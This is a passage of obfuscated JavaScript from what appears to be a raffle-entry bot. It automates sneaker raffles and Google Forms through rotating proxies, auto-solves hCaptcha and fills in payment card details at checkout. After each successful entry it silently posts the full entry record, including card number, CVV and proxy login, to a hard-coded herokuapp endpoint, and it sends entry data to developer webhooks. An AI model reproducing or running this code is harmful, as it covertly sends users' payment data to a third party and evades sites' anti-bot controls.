                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x36d0ed = await _0x1f1608['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x1373a5 = Math['round'](Math['random']() * (_0x36d0ed['length'] - 0x1));
                            await _0x36d0ed[_0x1373a5]['click']();
                        }
                        await _0x140651(0x4b0);
                        const _0x13f226 = await _0x1f1608['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x13f226[0x0]['click'](), await _0x1f1608['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x1f1608['type']('input[name=\x22email\x22]', '' + _0x10ef4b[_0x3dd95b]['Email']), await _0x140651(0x640), await _0x1f1608['type']('input[name=\x22phone\x22]', '' + _0x10ef4b[_0x3dd95b]['Phone']), await _0x140651(0x4b0), await _0x1f1608['click']('button.btn.continue-button__1RtsS'), await _0x140651(0x4b0);
                        try {
                            await _0x1f1608['type']('input[name=\x22firstName\x22]', '' + _0x10ef4b[_0x3dd95b]['FirstName']), await _0x140651(0x258);
                        } catch {
                            const _0x2aee5c = await _0x1f1608['$$eval']('.invalid-feedback\x20>\x20div', _0x4ade2e => {
                                return _0x4ade2e['map'](_0x5ab89c => _0x5ab89c['innerText']);
                            });
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20' + _0x2aee5c));
                            continue;
                        }
                        await _0x1f1608['type']('input[name=\x22lastName\x22]', '' + _0x10ef4b[_0x3dd95b]['LastName']), await _0x140651(0xc8), await _0x1f1608['type']('input[name=\x22instagramUsername\x22]', '' + _0x10ef4b[_0x3dd95b]['Follower']), await _0x140651(0x4b0), await _0x1f1608['click']('button.btn.continue-button__1RtsS'), await _0x140651(0x3e8), console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x1f1608['select']('select[name=\x22country\x22]', '' + _0x10ef4b[_0x3dd95b]['Country']), await _0x140651(0x2bc), await _0x1f1608['type']('input[name=\x22streetName\x22]', '' + _0x10ef4b[_0x3dd95b]['Address1']), await _0x140651(0x258), await _0x1f1608['type']('input[name=\x22houseNumber\x22]', _0x10ef4b[_0x3dd95b]['HouseNumber'] + '\x20' + _0x10ef4b[_0x3dd95b]['Address2']), await _0x140651(0xc8), await _0x1f1608['type']('input[name=\x22postalCode\x22]', '' + _0x10ef4b[_0x3dd95b]['Zip']), await _0x140651(0x1f4), await _0x1f1608['type']('input[name=\x22city\x22]', '' + _0x10ef4b[_0x3dd95b]['City']), await _0x140651(0x4b0), await _0x1f1608['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x140651(0x4b0), await _0x1f1608['click']('button.btn.continue-button__1RtsS'), await _0x140651(0x4b0), console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x1f1608['solveRecaptchas'](), console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x140651(0xbb8), await _0x1f1608['click']('button.btn.continue-button__1RtsS'), await _0x140651(0x1388), console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x1f1608['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1f1608['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x140651(0x4b0), await _0x1f1608['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x10ef4b[_0x3dd95b]['CardNumber']), await _0x140651(0x320), await _0x1f1608['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x1f1608['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x10ef4b[_0x3dd95b]['ExpiryDate']), await _0x140651(0x4b0), await _0x1f1608['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x1f1608['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x10ef4b[_0x3dd95b]['CVV']), await _0x140651(0x226), await _0x1f1608['type']('input[name=\x22holderName\x22]', '' + _0x10ef4b[_0x3dd95b]['NameOnCard']), await _0x140651(0x226), await _0x1f1608['click']('button.adyen-checkout__button'), console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x1f1608['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x140651(0xbb8);
                        } catch (_0x3f36c1) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x203DS\x20Failed')), _0x58552c = '3DS\x20Error\x20' + _0x3f36c1;
                            var _0x1a0f00 = await _0x11b6e5(_0x10ef4b[_0x3dd95b], _0x53cf8c, 'dev', !![], _0x58552c);
                            _0x329aec['errorDEV'] = { 'embeds': [_0x1a0f00] };
                            _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x329aec['errorDEV']);
                            await _0x29bde2(_0x2cdbb9, _0x329aec['errorDEV']);
                            continue;
                        }
                        _0x1ce4fb(_0x10ef4b[_0x3dd95b], _0x53cf8c), console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x54e0d5 = _0x10ef4b[_0x3dd95b];
                        try {
                            prxdata = {
                                'username': _0x34b198['replace']('#', ''),
                                'module': _0x53cf8c['name'],
                                'entrydata': JSON['stringify'](_0x54e0d5),
                                'proxy': '' + _0x1b3630[_0x3dd95b]
                            };
                            var _0x3825c8 = JSON['stringify'](prxdata);
                            let _0x2ced6a = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x3825c8, _0x2ced6a);
                        } catch (_0x1e778b) {
                        }
                        if (_0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '')
                            try {
                                await _0x29bde2(_0x342ed0['webhook'], _0x329aec['succesDEVMSG']);
                            } catch {
                            }
                        await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x329aec['succesDEVMSG']), await _0x140651(0xc8);
                        try {
                            await _0x29bde2(_0x259650, _0x329aec['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x5dac3f) {
                        console['log'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20' + _0x5dac3f), _0x58552c = '' + _0x5dac3f;
                        var _0x1a0f00 = await _0x11b6e5(_0x10ef4b[_0x3dd95b], _0x53cf8c, 'dev', !![], _0x58552c);
                        _0x329aec['errorDEV'] = { 'embeds': [_0x1a0f00] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x329aec['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x329aec['errorDEV']), _0x30861a = 'yes';
                    } finally {
                        _0x4602c3['close']();
                        if (_0x30861a == 'yes' && _0x57b4d4 != 0x5) {
                            console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x53cf8c['name'] + ']\x20Task\x20' + (_0x3dd95b + 0x1) + '\x20:\x20Retrying\x20(' + _0x57b4d4 + '\x20/\x205)')), _0x3dd95b = _0x3dd95b - 0x1, _0x57b4d4 = _0x57b4d4 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x4ab4cf, _0x378f5e, _0x2d23f1) {
                let _0x105235 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x323d2d = _0x7a56eb['readFileSync']('forms/templates.json', 'utf-8');
                let _0x39a60d = JSON['parse'](_0x323d2d), _0x14127b = ![];
                if (_0x39a60d['length'] != 0x0) {
                    let _0x57a63a = 0x0;
                    for (template of _0x39a60d) {
                        if (template['Url'] == _0x378f5e[0x0]['Url']) {
                            _0x14127b = !![], console['log'](_0x16a3a0['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0x16a3a0['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0x16a3a0['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x269f7e() {
                                let _0x5566ba = await _0x125485['get']('answer');
                                if (_0x5566ba['answer']['toLowerCase']() != 'y' && _0x5566ba['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x269f7e();
                                return _0x5566ba['answer']['toLowerCase']();
                            }
                            if (await _0x269f7e() == 'n') {
                                _0x39a60d['splice'](_0x57a63a, 0x1), console['clear']();
                                break;
                            }
                            _0x105235 = template, console['clear']();
                            break;
                        }
                        _0x57a63a++;
                    }
                }
                let _0xc1c681 = 0x0, _0x37ecfd = 0x0;
                function _0x12aac6(_0xf1ff4f) {
                    console['log'](_0x597cbe() + '\x20[' + _0x4ab4cf['name'] + ']\x20Task\x20' + (_0x30dfc5 + 0x1) + '\x20:\x20' + _0xf1ff4f);
                }
                var _0x2997c5 = 0x0;
                for (key in _0x105235) {
                    if (key['includes']('custom'))
                        _0xc1c681++;
                    if (key['includes']('Select'))
                        _0x37ecfd++;
                }
                for (var _0x30dfc5 = 0x0; _0x30dfc5 < _0x378f5e['length']; _0x30dfc5++) {
                    _0x105235['Url'] = _0x378f5e[_0x30dfc5]['Url'];
                    let _0xd47efb = ![];
                    if (_0x39a60d['length'] != 0x0)
                        for (template of _0x39a60d) {
                            if (template['Url'] == _0x378f5e[_0x30dfc5]['Url']) {
                                _0x105235 = template, _0xd47efb = !![], _0x12aac6('Found\x20Template');
                                break;
                            }
                        }
                    var _0x2efa0c;
                    if (_0x4d644d != 'yes') {
                        if (!_0x4d644d)
                            var _0x4d644d = '';
                        else
                            _0x4d644d = '';
                        _0x2997c5 = 0x0;
                    }
                    try {
                        await _0x58ea73(_0x378f5e, _0x30dfc5);
                    } catch {
                        _0x4d644d = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x342ed0['useRandomProxy'] = ![])
                        var _0xd96def = _0x2d23f1[_0x30dfc5]['split'](':');
                    else
                        var _0x20a66c = Math['round'](Math['random']() * (_0x2d23f1['length'] - 0x1)), _0xd96def = _0x2d23f1[_0x20a66c]['split'](':');
                    var _0xb20e8e;
                    if (_0xd96def['length'] == 0x1)
                        try {
                            _0xb20e8e = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xb20e8e = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0xb20e8e = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd96def[0x0] + ':' + _0xd96def[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xb20e8e = await _0x51ff47['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd96def[0x0] + ':' + _0xd96def[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x1fad83 = { 'first': ![] };
                        const _0x134338 = await _0xb20e8e['newPage']();
                        if (_0xd96def['length'] != 0x0)
                            await _0x134338['authenticate']({
                                'username': '' + _0xd96def[0x2],
                                'password': '' + _0xd96def[0x3]
                            });
                        _0x12aac6('Getting\x20Session');
                        let _0x2e6ef8 = ![];
                        try {
                            await _0x134338['goto'](_0x378f5e[_0x30dfc5]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x140651(0xbb8);
                        } catch (_0x18a7ae) {
                            throw new Error(_0x18a7ae);
                        }
                        const _0xa6a345 = await _0x134338['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0xa6a345) {
                            _0x12aac6('Login\x20Detected');
                            let _0x541739 = await _0xa6a345['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x541739['click'](), _0x2e6ef8 = !![];
                        }
                        let _0x886dd5 = await _0x134338['$']('#identifierId');
                        _0x886dd5 && (_0x2e6ef8 = !![]);
                        await _0x134338['waitForSelector']('.teQAzf');
                        async function _0xf915ac() {
                            let _0x557279 = await _0x134338['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x557279) {
                                let _0x41aa9d;
                                try {
                                    _0x41aa9d = await question['$eval']('.M7eMe', _0x5710ec => _0x5710ec['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0xc1c681 != 0x0) {
                                    let _0xb19e96 = ![];
                                    for (let _0x5c41d2 = 0x0; _0x5c41d2 < _0xc1c681; _0x5c41d2++) {
                                        if (_0x41aa9d == _0x105235['custom' + _0x5c41d2]['title']) {
                                            _0x12aac6('Custom\x20Selector\x20found;\x20' + _0x41aa9d);
                                            let _0x427500 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x18abd7 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x427500)
                                                await _0x427500['type']('' + _0x105235['custom' + _0x5c41d2]['answer']);
                                            else
                                                _0x18abd7 && await _0x18abd7['type']('' + _0x105235['custom' + _0x5c41d2]['answer']);
                                            _0xb19e96 = !![];
                                            break;
                                        }
                                    }
                                    if (_0xb19e96) {
                                        await _0x140651(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x37ecfd != 0x0) {
                                    let _0x41ec2b = ![];
                                    for (let _0x48750f = 0x0; _0x48750f < _0x37ecfd; _0x48750f++) {
                                        if (_0x41aa9d == _0x105235[_0x48750f + 'Select']['title']) {
                                            _0x12aac6('Custom\x20Selector\x20found;\x20' + _0x41aa9d);
                                            let _0xfad8cf = await question['$$']('.ulDsOb');
                                            for (opt of _0x105235[_0x48750f + 'Select']['answer']) {
                                                let _0xd869ae = await _0xfad8cf[opt]['$']('span');
                                                await _0xd869ae['click']();
                                            }
                                            _0x41ec2b = !![];
                                            break;
                                        }
                                    }
                                    if (_0x41ec2b) {
                                        await _0x140651(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x41aa9d == _0x105235['0Select']['title']) {
                                        _0x12aac6('Custom\x20Selector\x20found;\x20' + _0x105235['0Select']['title']);
                                        let _0x19c2ab = await question['$$']('.ulDsOb'), _0x74842b = await _0x19c2ab[_0x105235['0Select']['answer']];
                                        await _0x74842b['click']();
                                        continue;
                                    }
                                    if (_0x41aa9d == _0x105235['1Select']['title']) {
                                        _0x12aac6('Custom\x20Selector\x20found;\x20' + _0x105235['1Select']['title']);
                                        let _0x4f1a48 = await question['$$']('.ulDsOb'), _0x1d9c89 = await _0x4f1a48[_0x105235['1Select']['answer']];
                                        await _0x1d9c89['click']();
                                        continue;
                                    }
                                    if (_0x41aa9d == _0x105235['2Select']['title']) {
                                        _0x12aac6('Custom\x20Selector\x20found;\x20' + _0x105235['2Select']['title']);
                                        let _0x462d6c = await question['$$']('.ulDsOb'), _0x383eee = await _0x462d6c[_0x105235['2Select']['answer']];
                                        await _0x383eee['click']();
                                        continue;
                                    }
                                } catch (_0x16c2b5) {
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('mail') && !_0x41aa9d['toLowerCase']()['includes']('agree') || _0x41aa9d == _0x105235['Email']) {
                                    _0x12aac6('Mail\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0xc4756a = await question['$']('input');
                                    !_0xc4756a && (_0xc4756a = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0xc4756a['type'](_0x378f5e[_0x30dfc5]['Email']), await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('first') || _0x41aa9d['toLowerCase']() == 'name' || _0x41aa9d['toLowerCase']() == 'name\x20' || _0x41aa9d == _0x105235['FirstName']) {
                                    _0x12aac6('FirstName\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0x4a03c3 = await question['$']('input');
                                    !_0x4a03c3 && (_0x4a03c3 = await question['$']('textarea'));
                                    await _0x4a03c3['type'](_0x378f5e[_0x30dfc5]['FirstName'] + '\x20'), await _0x140651(0x258);
                                    if (_0x41aa9d == _0x105235['FirstName'])
                                        continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('last') || _0x41aa9d['toLowerCase']()['includes']('surname') || _0x41aa9d == _0x105235['LastName']) {
                                    _0x12aac6('LastName\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0xb5d60b = await question['$']('input');
                                    !_0xb5d60b && (_0xb5d60b = await question['$']('textarea'));
                                    await _0xb5d60b['type'](_0x378f5e[_0x30dfc5]['LastName'] + '\x20'), await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('address') && !_0x41aa9d['toLowerCase']()['includes']('agree') || _0x41aa9d == _0x105235['Address']) {
                                    _0x12aac6('Address\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0x40a42c = await question['$']('input');
                                    !_0x40a42c && (_0x40a42c = await question['$']('textarea'));
                                    await _0x40a42c['type'](_0x378f5e[_0x30dfc5]['Address1'] + '\x20' + _0x378f5e[_0x30dfc5]['HouseNumber'] + '\x20' + _0x378f5e[_0x30dfc5]['Address2']), await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('phone') || _0x41aa9d['toLowerCase']()['includes']('mobile') || _0x41aa9d == _0x105235['Phone']) {
                                    _0x12aac6('Phone\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0x84c177 = await question['$']('input');
                                    !_0x84c177 && (_0x84c177 = await question['$']('textarea'));
                                    await _0x84c177['type']('' + _0x378f5e[_0x30dfc5]['Phone']), await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('country') || _0x41aa9d == _0x105235['Country']) {
                                    let _0xdeb16f = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0xdeb16f) {
                                        let _0x282760 = ![], _0x687953 = await _0xdeb16f['$$']('.ulDsOb');
                                        for (option of _0x687953) {
                                            let _0x2657f0 = await option['$']('span'), _0x211bdf = await option['$eval']('span', _0x484555 => _0x484555['textContent']);
                                            if (_0x211bdf['toLowerCase']() == _0x378f5e[_0x30dfc5]['Country']['toLowerCase']()) {
                                                await _0x2657f0['click'](), _0x282760 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x282760) {
                                            const _0x4e11ec = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x4e11ec['click'](), await _0x4e11ec['type'](_0x378f5e[_0x30dfc5]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x12aac6('Country\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0x32de30 = await question['$']('input');
                                    !_0x32de30 && (_0x32de30 = await question['$']('textarea'));
                                    await _0x32de30['type']('' + _0x378f5e[_0x30dfc5]['Country']), await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('city') || _0x41aa9d == _0x105235['City']) {
                                    _0x12aac6('City\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0x5be3b5 = await question['$']('input');
                                    !_0x5be3b5 && (_0x5be3b5 = await question['$']('textarea'));
                                    await _0x5be3b5['type']('' + _0x378f5e[_0x30dfc5]['City']), await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('zip') || _0x41aa9d == _0x105235['Zip']) {
                                    _0x12aac6('Zip\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0x44a659 = await question['$']('input');
                                    !_0x44a659 && (_0x44a659 = await question['$']('textarea'));
                                    await _0x44a659['type']('' + _0x378f5e[_0x30dfc5]['Zip']), await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('insta') || _0x41aa9d == _0x105235['Follower']) {
                                    _0x12aac6('Follower\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0x49597d = await question['$']('input');
                                    !_0x49597d && (_0x49597d = await question['$']('textarea'));
                                    await _0x49597d['type']('' + _0x378f5e[_0x30dfc5]['Follower']), await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('size') || _0x41aa9d == _0x105235['Size']) {
                                    _0x12aac6('Size\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0x1b74d3 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x1b74d3) {
                                        let _0x3a2d84 = await _0x1b74d3['$$']('.ulDsOb');
                                        if (_0x378f5e[_0x30dfc5]['Size']['toLowerCase']() == 'random') {
                                            var _0x49e0c0 = Math['round'](Math['random']() * (_0x3a2d84['length'] - 0x1));
                                            await _0x3a2d84[_0x49e0c0]['click']();
                                        } else
                                            for (size of _0x3a2d84) {
                                                let _0x54d956 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x370fc8 => _0x370fc8['textContent']);
                                                if (_0x54d956['toLowerCase']()['includes'](_0x378f5e[_0x30dfc5]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x32da39 = await question['$']('.ry3kXd');
                                    if (_0x32da39) {
                                        await _0x32da39['click'](), await _0x140651(0x9c4);
                                        let _0x4967db = await _0x134338['$']('div[jsname=\x22V68bde\x22]'), _0x130b1a = await _0x4967db['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x130b1a) {
                                            let _0x4fef2a = await size['$eval']('.vRMGwf.oJeWuf', _0x22fa6f => _0x22fa6f['textContent']), _0x5cc6f7 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x4fef2a['toLowerCase']()['includes'](_0x378f5e[_0x30dfc5]['Size'])) {
                                                await _0x140651(0x190), await _0x5cc6f7['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('receive') || _0x41aa9d['toLowerCase']()['includes']('method')) {
                                    _0x12aac6('Method\x20Selector\x20found;\x20' + _0x41aa9d);
                                    let _0x2dcb7e = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x2dcb7e) {
                                        const _0x290f35 = await _0x2dcb7e['$$']('.ulDsOb');
                                        for (size of _0x290f35) {
                                            let _0x4dac2a = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x536fef => _0x536fef['textContent']);
                                            if (_0x4dac2a['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x140651(0x258);
                                    continue;
                                }
                                if (_0x41aa9d['toLowerCase']()['includes']('offers') || _0x41aa9d['toLowerCase']()['includes']('agree')) {
                                    _0x12aac6('Authorization\x20Selector\x20found;\x20' + _0x41aa9d);
                                    const _0x398520 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x398520) {
                                        const _0x444100 = await _0x398520['$$']('.ulDsOb');
                                        for (size of _0x444100) {
                                            let _0x1186de = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x4f49c6 => _0x4f49c6['textContent']);
                                            if (_0x1186de['toLowerCase']()['includes']('authorize') || _0x1186de['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x140651(0x258);
                                    continue;
                                }
                                async function _0x557a5c() {
                                    let _0x3db8a2 = await question['$']('.oyXaNc');
                                    if (_0x3db8a2) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x16a3a0['cyan'](_0x41aa9d) + '\x0a');
                                        let _0x29c3b9 = await question['$$']('.ulDsOb');
                                        for (let _0x543891 = 0x0; _0x543891 < _0x29c3b9['length']; _0x543891++) {
                                            let _0x2a2ba6 = await _0x29c3b9[_0x543891]['$eval']('span', _0x2e9445 => _0x2e9445['textContent']);
                                            console['log']('\x20(' + _0x543891 + ')\x20' + _0x2a2ba6);
                                        }
                                        console['log']();
                                        let _0x2375c7 = await _0x125485['get']('option'), _0xed68d4 = await _0x29c3b9[_0x2375c7['option']]['$eval']('span', _0x3ac7e3 => _0x3ac7e3['textContent']);
                                        _0x105235[_0x37ecfd + 'Select'] = {
                                            'title': _0x41aa9d,
                                            'answer': _0x2375c7['option']['split'](',')
                                        };
                                        let _0x35589b = await _0x29c3b9[_0x2375c7['option']]['$']('span');
                                        await _0x35589b['click'](), _0x37ecfd++;
                                        return;
                                    }
                                    let _0x50d477 = await question['$']('.Y6Myld');
                                    if (_0x50d477) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x16a3a0['cyan'](_0x41aa9d) + '\x0a');
                                        let _0x31f20b = await question['$$']('.ulDsOb');
                                        for (let _0x3ba0cd = 0x0; _0x3ba0cd < _0x31f20b['length']; _0x3ba0cd++) {
                                            let _0x36b7f6 = await _0x31f20b[_0x3ba0cd]['$eval']('span', _0x569049 => _0x569049['textContent']);
                                            console['log']('\x20(' + _0x3ba0cd + ')\x20' + _0x36b7f6);
                                        }
                                        console['log']();
                                        let _0x1073c9 = await _0x125485['get']('option');
                                        _0x105235[_0x37ecfd + 'Select'] = {
                                            'title': _0x41aa9d,
                                            'answer': _0x1073c9['option']['split'](',')
                                        };
                                        for (opt of _0x105235[_0x37ecfd + 'Select']['answer']) {
                                            let _0x173e03 = await _0x31f20b[opt]['$']('span');
                                            await _0x173e03['click']();
                                        }
                                        _0x37ecfd++;
                                        return;
                                    }
                                    var _0x46e0a0 = 0x0;
                                    let _0x1355d9 = Object['keys'](_0x105235);
                                    console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0x16a3a0['cyan'](_0x41aa9d) + '\x0a');
                                    for (data of _0x1355d9) {
                                        !data['includes']('custom' && !data['includes']('Select')) ? console['log']('\x20(' + _0x46e0a0 + ')\x20' + data + '\x20(Taken\x20from\x20csv)') : console['log']('\x20(' + _0x46e0a0 + ')\x20' + data), _0x46e0a0++;
                                    }
                                    console['log']('\x20(' + _0x1355d9['length'] + ')\x20Custom\x20input:'), console['log']();
                                    let _0x214575 = await _0x125485['get']('input');
                                    if (_0x214575['input'] == _0x1355d9['length']) {
                                        console['log']('What\x20should\x20the\x20bot\x20fill\x20in\x20this\x20input?\x0a');
                                        let _0x1cd19a = await _0x125485['get']('input');
                                        _0x105235['custom' + _0xc1c681] = {
                                            'title': _0x41aa9d,
                                            'answer': '' + _0x1cd19a['input']
                                        };
                                        let _0xd01d96 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x4d315e = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                        if (_0xd01d96)
                                            await _0xd01d96['type']('' + _0x105235['custom' + _0xc1c681]['answer']);
                                        else
                                            _0x4d315e && await _0x4d315e['type']('' + _0x105235['custom' + _0xc1c681]['answer']);
                                        _0xc1c681++;
                                        return;
                                    }
                                    _0x105235['' + _0x1355d9[_0x214575['input']]] = _0x41aa9d;
                                    let _0x575fa9 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x1184b4 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                    _0x575fa9 && await _0x575fa9['type']('' + _0x378f5e[_0x30dfc5]['' + _0x1355d9[_0x214575['input']]]), _0x1184b4 && await _0x1184b4['type']('' + _0x378f5e[_0x30dfc5]['' + _0x1355d9[_0x214575['input']]]), await _0x140651(0x258);
                                }
                                await _0x557a5c(), await _0x140651(0x37a);
                            }
